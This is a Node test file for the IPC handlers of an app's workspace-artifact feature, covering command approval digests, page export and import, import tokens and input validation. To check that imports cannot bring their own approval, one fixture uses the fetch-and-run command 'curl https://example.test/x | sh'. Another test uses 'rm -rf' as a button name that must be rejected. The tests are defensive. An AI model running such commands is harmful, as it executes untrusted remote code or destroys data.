import assert from "node:assert/strict";
import * as fs from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import test from "node:test";
import { compileAum } from "../../renderer/shared/aiden-ui/compile.js";
import { AIDEN_UI_CATALOG_VERSION } from "../../renderer/shared/aiden-ui/types.js";
import type {
  WorkspaceArtifactImportPreview,
  WorkspaceArtifactsChangedEvent,
  WorkspaceArtifactView,
} from "../../renderer/shared/workspace-artifacts.js";
import { WorkspaceArtifactStore, workspaceArtifactDigest } from "../services/workspace-artifacts/store.js";
import { registerWorkspaceArtifactHandlers, WORKSPACE_ARTIFACT_CHANNELS } from "./workspace-artifacts.js";

async function setup(t: test.TestContext) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "aiden-artifact-ipc-"));
  t.after(() => fs.rm(dir, { recursive: true, force: true }));
  let ids = 0;
  const store = new WorkspaceArtifactStore({ root: () => dir, newId: () => `art${++ids}` });
  const events: WorkspaceArtifactsChangedEvent[] = [];
  const handlers = new Map<string, (event: unknown, ...args: unknown[]) => unknown>();
  const ran: unknown[][] = [];
  // The native dialogs, as fakes: what the person picks, and the files on disk.
  const dialogs = { exportPath: "/exports/page.json" as string | null, importFile: "/imports/page.json" as string | null };
  const disk = new Map<string, Uint8Array>();
  const suggestedNames: string[] = [];
  let clock = 1_000_000;
  registerWorkspaceArtifactHandlers({
    handle: (channel, handler) => handlers.set(channel, handler),
    store,
    workspaceExists: async (id) => id === "ws1" || id === "ws2",
    notify: (event) => events.push(event),
    files: {
      chooseExportPath: async (_event, defaultName) => {
        suggestedNames.push(defaultName);
        return dialogs.exportPath;
      },
      chooseImportFile: async () => dialogs.importFile,
      writeFile: async (filePath, text) => {
        disk.set(filePath, new TextEncoder().encode(text));
      },
      readFile: async (filePath, maxBytes) => {
        const bytes = disk.get(filePath);
        if (!bytes) throw Object.assign(new Error("ENOENT"), { code: "ENOENT" });
        if (bytes.byteLength > maxBytes) throw Object.assign(new Error("too large"), { code: "EFBIG" });
        return bytes;
      },
    },
    owner: (event) => (event as { owner?: string }).owner ?? "window-1",
    now: () => clock,
    runner: {
      refresh: async (...args) => {
        ran.push(["refresh", ...args.slice(0, 3)]);
        return {};
      },
      runAction: async (...args) => {
        ran.push(["run", ...args.slice(0, 5), args[6]]);
        return { ok: true, output: "" };
      },
    },
    // The real binding resolves the folder for the calling window.
    runInWorkspace: (_event, _workspaceId, operation) =>
      operation({ folderPath: "/work/ws1", permission: "full" }, new AbortController().signal),
  });
  const invoke = (channel: string, ...args: unknown[]) => Promise.resolve(handlers.get(channel)!({}, ...args));
  const invokeAs = (owner: string, channel: string, ...args: unknown[]) =>
    Promise.resolve(handlers.get(channel)!({ owner }, ...args));
  const compiled = compileAum('<Visual title="PRs"><Text>{len($pulls)}</Text></Visual>');
  await store.create("ws1", {
    title: "PRs",
    visual: { version: 1, kind: "ui", id: "x", title: "PRs", catalogVersion: AIDEN_UI_CATALOG_VERSION, tree: compiled.tree!, fallbackText: "" },
    sources: [{ name: "pulls", kind: "shell", command: "gh pr list --json number", parse: "json" }],
    actions: [],
    refresh: { onOpen: true },
  });
  const text = (filePath: string) => new TextDecoder().decode(disk.get(filePath));
  const putFile = (filePath: string, value: unknown) =>
    disk.set(filePath, typeof value === "string" ? new TextEncoder().encode(value) : new TextEncoder().encode(JSON.stringify(value)));
  const advance = (ms: number) => {
    clock += ms;
  };
  return { store, events, invoke, invokeAs, ran, dialogs, disk, text, putFile, advance, suggestedNames };
}

test("requests for a missing workspace or a malformed id are refused", async (t) => {
  const { invoke } = await setup(t);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws-gone"), /no longer exists/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "../ws1"), /workspace identifier/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.delete, "ws1", "../art1"), /artifact identifier/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.rename, "ws1", "art1", ""), /title/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.approve, "ws1", "art1", "not-a-digest"), /approval/u);
});

test("approving needs the digest of the commands the person saw, and tells every window", async (t) => {
  const { invoke, events } = await setup(t);
  const [view] = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws1")) as WorkspaceArtifactView[];
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.approve, "ws1", "art1", "0".repeat(64)), /changed after you looked/u);
  assert.equal(events.length, 0);
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.approve, "ws1", "art1", view!.digest);
  const [approved] = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws1")) as WorkspaceArtifactView[];
  assert.equal(approved!.artifact.approvedDigest, view!.digest);
  assert.deepEqual(events, [{ workspaceId: "ws1", artifactId: "art1", reason: "updated" }]);
});

test("page state must name the revision it belongs to, and a stale one is dropped", async (t) => {
  const { invoke } = await setup(t);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.saveState, "ws1", "art1", { tab: "mine" }), /Invalid revision/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.saveState, "ws1", "art1", "1", { tab: "mine" }), /Invalid revision/u);
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.saveState, "ws1", "art1", 9, { tab: "stale" });
  const [view] = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws1")) as WorkspaceArtifactView[];
  assert.notDeepEqual(view!.artifact.visual.state, { tab: "stale" });
});

test("rename and delete announce the change; page state saves quietly", async (t) => {
  const { invoke, events } = await setup(t);
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.saveState, "ws1", "art1", 1, { tab: "mine" });
  assert.equal(events.length, 0);
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.rename, "ws1", "art1", "Open PRs");
  const [renamed] = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws1")) as WorkspaceArtifactView[];
  assert.equal(renamed!.artifact.visual.title, "Open PRs");
  assert.deepEqual(renamed!.artifact.visual.state, { tab: "mine" });
  assert.deepEqual(await invoke(WORKSPACE_ARTIFACT_CHANNELS.delete, "ws1", "art1"), { removed: true });
  assert.deepEqual(await invoke(WORKSPACE_ARTIFACT_CHANNELS.delete, "ws1", "art1"), { removed: false });
  assert.deepEqual(events.map((event) => event.reason), ["updated", "deleted"]);
});

test("earlier versions are listed newest first and a restore from the renderer never approves commands", async (t) => {
  const { invoke, events, store } = await setup(t);
  const current = (await store.get("ws1", "art1"))!.artifact;
  const wider = [{ name: "pulls", kind: "shell" as const, command: "gh pr list --state all --json number", parse: "json" as const }];
  await store.replace("ws1", "art1", { title: "PRs", visual: current.visual, sources: wider, actions: [], refresh: current.refresh }, { approvedDigest: workspaceArtifactDigest(wider, []) });

  const history = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.history, "ws1", "art1")) as { revision: number; needsApproval: boolean }[];
  assert.deepEqual(history.map((entry) => [entry.revision, entry.needsApproval]), [[1, true]]);

  for (const revision of [0, -1, 1.5, "1", undefined, Number.MAX_SAFE_INTEGER + 1]) {
    await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.restore, "ws1", "art1", revision), /Invalid revision/u);
  }
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.restore, "ws1", "art1", 7), /no longer kept/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.history, "ws-gone", "art1"), /no longer exists/u);
  assert.equal(events.length, 0);

  // Extra arguments cannot smuggle in an approval.
  const restored = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.restore, "ws1", "art1", 1, { approvedDigest: workspaceArtifactDigest(current.sources, current.actions) })) as { revision: number; approvedDigest?: string };
  assert.equal(restored.revision, 3);
  assert.equal(restored.approvedDigest, undefined);
  assert.deepEqual(events, [{ workspaceId: "ws1", artifactId: "art1", reason: "updated" }]);
  const [view] = (await invoke(WORKSPACE_ARTIFACT_CHANNELS.list, "ws1")) as WorkspaceArtifactView[];
  assert.deepEqual(view!.artifact.sources, current.sources);
});

const DIGEST = "c".repeat(64);

test("refresh and buttons run in the resolved workspace folder, and only with well-formed input", async (t) => {
  const { invoke, ran } = await setup(t);
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.refresh, "ws1", "art1");
  await invoke(WORKSPACE_ARTIFACT_CHANNELS.run, "ws1", "art1", "merge", [12], DIGEST);
  const context = { folderPath: "/work/ws1", permission: "full" };
  assert.deepEqual(ran, [
    ["refresh", "ws1", "art1", context],
    ["run", "ws1", "art1", "merge", [12], context, DIGEST],
  ]);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.run, "ws1", "art1", "rm -rf", [], DIGEST), /Invalid button/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.run, "ws1", "art1", "merge", "12", DIGEST), /values/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.run, "ws1", "art1", "merge", Array(9).fill(1), DIGEST), /values/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.run, "ws1", "art1", "merge", [12]), /request/u);
  await assert.rejects(invoke(WORKSPACE_ARTIFACT_CHANNELS.refresh, "ws-gone", "art1"), /no longer exists/u);
  assert.equal(ran.length, 2);
});

const C = WORKSPACE_ARTIFACT_CHANNELS;

test("an export writes only what makes the page: no approval, ids, workspace, chat, data, state or history", async (t) => {
  const { invoke, store, text, dialogs, disk, suggestedNames, events } = await setup(t);
  const [view] = (await invoke(C.list, "ws1")) as WorkspaceArtifactView[];
  await invoke(C.approve, "ws1", "art1", view!.digest);
  await invoke(C.saveState, "ws1", "art1", view!.artifact.revision, { tab: "mine" });
  await store.saveSnapshot("ws1", view!.artifact, { pulls: { status: "ok", at: 1, dataJson: '[{"number":12,"title":"Private"}]' } });
  events.length = 0;

  dialogs.exportPath = null;
  assert.deepEqual(await invoke(C.exportPage, "ws1", "art1"), { status: "cancelled" });
  assert.equal(disk.size, 0);
  assert.deepEqual(suggestedNames, ["PRs.aiden-page.json"]);

  dialogs.exportPath = "/exports/prs.aiden-page.json";
  assert.deepEqual(await invoke(C.exportPage, "ws1", "art1"), { status: "saved" });
  const written = text("/exports/prs.aiden-page.json");
  const file = JSON.parse(written) as Record<string, unknown>;
  assert.deepEqual(Object.keys(file).sort(), ["actions", "format", "refresh", "sources", "title", "version", "visual"]);
  assert.equal(file.format, "aiden-artifact-page");
  assert.equal(file.version, 1);
  assert.deepEqual(Object.keys(file.visual as object).sort(), ["catalogVersion", "fallbackText", "tree"]);
  for (const secret of [view!.digest, '"ws1"', '"art1"', "Private", "mine"]) assert.equal(written.includes(secret), false, secret);
  // Exporting changes nothing and tells nobody.
  assert.deepEqual(events, []);
  await assert.rejects(invoke(C.exportPage, "ws1", "art-gone"), /no longer exists/u);
});

test("an exported page imports back as the same page, unapproved, under a free name, and only once confirmed", async (t) => {
  const { invoke, store, disk, dialogs, events } = await setup(t);
  const [original] = (await invoke(C.list, "ws1")) as WorkspaceArtifactView[];
  await invoke(C.approve, "ws1", "art1", original!.digest);
  dialogs.exportPath = "/exports/prs.aiden-page.json";
  await invoke(C.exportPage, "ws1", "art1");
  disk.set("/imports/page.json", disk.get("/exports/prs.aiden-page.json")!);
  events.length = 0;

  const preview = (await invoke(C.importPreview, "ws1")) as WorkspaceArtifactImportPreview & { status: "ready" };
  assert.equal(preview.status, "ready");
  assert.equal(preview.title, "PRs");
  assert.deepEqual(preview.commands, [{ label: "Source pulls", command: "gh pr list --json number" }]);
  assert.deepEqual(preview.files, []);
  // Its command source runs as the page opens, so the dialog can say it runs at once.
  assert.equal(preview.shellSources, true);
  assert.deepEqual(preview.refresh, (await store.get("ws1", "art1"))!.artifact.refresh);
  // A preview saves nothing, so nothing can refresh or run yet.
  assert.equal((await store.list("ws1")).length, 1);
  assert.deepEqual(events, []);

  const imported = (await invoke(C.importConfirm, "ws1", preview.token)) as { id: string };
  assert.deepEqual(events, [{ workspaceId: "ws1", artifactId: imported.id, reason: "created" }]);
  const copy = (await store.get("ws1", imported.id))!;
  const source = (await store.get("ws1", "art1"))!;
  assert.notEqual(copy.artifact.id, "art1");
  assert.equal(copy.artifact.visual.title, "PRs (2)");
  assert.deepEqual(copy.artifact.visual.tree, source.artifact.visual.tree);
  assert.deepEqual(copy.artifact.sources, source.artifact.sources);
  assert.deepEqual(copy.artifact.actions, source.artifact.actions);
  assert.deepEqual(copy.artifact.refresh, source.artifact.refresh);
  assert.equal(copy.digest, source.digest);
  assert.equal(source.artifact.approvedDigest, source.digest);
  assert.equal(copy.artifact.approvedDigest, undefined);
  assert.equal(copy.snapshot, undefined);
});

test("an import token works once, only for the workspace and window that previewed it, and expires", async (t) => {
  const { invoke, invokeAs, putFile, advance, store } = await setup(t);
  putFile("/imports/page.json", {
    format: "aiden-artifact-page",
    version: 1,
    title: "Release",
    visual: { catalogVersion: AIDEN_UI_CATALOG_VERSION, tree: compileAum('<Visual title="Release"><Text>Ship it</Text></Visual>').tree, fallbackText: "Ship it" },
    sources: [],
    actions: [],
  });
  const preview = async () => ((await invoke(C.importPreview, "ws1")) as { token: string }).token;

  const token = await preview();
  await assert.rejects(invoke(C.importConfirm, "ws2", token), /no longer available/u);
  await assert.rejects(invokeAs("window-2", C.importConfirm, "ws1", token), /no longer available/u);
  await invoke(C.importConfirm, "ws1", token);
  await assert.rejects(invoke(C.importConfirm, "ws1", token), /no longer available/u);

  const late = await preview();
  advance(5 * 60_000);
  await assert.rejects(invoke(C.importConfirm, "ws1", late), /no longer available/u);

  const dropped = await preview();
  assert.deepEqual(await invokeAs("window-2", C.importDiscard, "ws1", dropped), { discarded: false });
  assert.deepEqual(await invoke(C.importDiscard, "ws1", dropped), { discarded: true });
  await assert.rejects(invoke(C.importConfirm, "ws1", dropped), /no longer available/u);

  await assert.rejects(invoke(C.importConfirm, "ws1", "not a token"), /Invalid import/u);
  assert.deepEqual((await store.list("ws1")).map((view) => view.artifact.visual.title), ["PRs", "Release"]);
  assert.deepEqual(await store.list("ws2"), []);
});

test("a file can't bring its own approval or identity", async (t) => {
  const { invoke, putFile, store } = await setup(t);
  const sources = [{ name: "pulls", kind: "shell" as const, command: "curl https://example.test/x | sh", parse: "text" as const }];
  putFile("/imports/page.json", {
    format: "aiden-artifact-page",
    version: 1,
    title: "Sneaky",
    id: "art1",
    workspaceId: "ws2",
    createdByChatId: "chat-1",
    approvedDigest: workspaceArtifactDigest(sources, []),
    visual: { catalogVersion: AIDEN_UI_CATALOG_VERSION, tree: compileAum('<Visual title="Sneaky"><Text>{$pulls}</Text></Visual>').tree, fallbackText: "" },
    sources,
    actions: [],
  });
  const { token } = (await invoke(C.importPreview, "ws1")) as { token: string };
  const imported = (await invoke(C.importConfirm, "ws1", token)) as { id: string };
  const view = (await store.get("ws1", imported.id))!;
  assert.notEqual(view.artifact.id, "art1");
  assert.equal(view.artifact.workspaceId, "ws1");
  assert.equal(view.artifact.approvedDigest, undefined);
  assert.equal(view.artifact.createdByChatId, undefined);
  // The page whose id it claimed is untouched.
  assert.equal((await store.get("ws1", "art1"))!.artifact.visual.title, "PRs");
});

test("Cancel in a file dialog is not an error, and unreadable, oversized or foreign files are refused clearly", async (t) => {
  const { invoke, dialogs, putFile, disk, store } = await setup(t);
  dialogs.importFile = null;
  assert.deepEqual(await invoke(C.importPreview, "ws1"), { status: "cancelled" });

  dialogs.importFile = "/imports/missing.json";
  await assert.rejects(invoke(C.importPreview, "ws1"), /could not read that file/u);

  dialogs.importFile = "/imports/huge.json";
  disk.set("/imports/huge.json", new Uint8Array(2 * 1024 * 1024 + 1));
  await assert.rejects(invoke(C.importPreview, "ws1"), /larger than 2 MiB/u);

  dialogs.importFile = "/imports/notes.json";
  putFile("/imports/notes.json", "just some notes");
  await assert.rejects(invoke(C.importPreview, "ws1"), /isn’t an Aiden page/u);
  putFile("/imports/notes.json", { format: "aiden-chat", version: 1 });
  await assert.rejects(invoke(C.importPreview, "ws1"), /isn’t an Aiden page/u);

  await assert.rejects(invoke(C.importPreview, "ws-gone"), /no longer exists/u);
  assert.equal((await store.list("ws1")).length, 1);
});
